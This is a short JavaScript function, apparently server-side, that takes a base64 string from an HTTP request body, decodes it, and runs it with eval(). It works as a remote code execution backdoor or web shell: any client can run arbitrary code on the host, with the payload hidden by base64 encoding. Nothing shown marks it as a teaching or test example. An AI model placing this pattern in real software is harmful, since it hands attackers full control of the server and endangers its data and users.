function runEncoded(req) {
    const raw = Buffer.from(req.body.b64, 'base64').toString('utf-8');
    eval(raw);
}
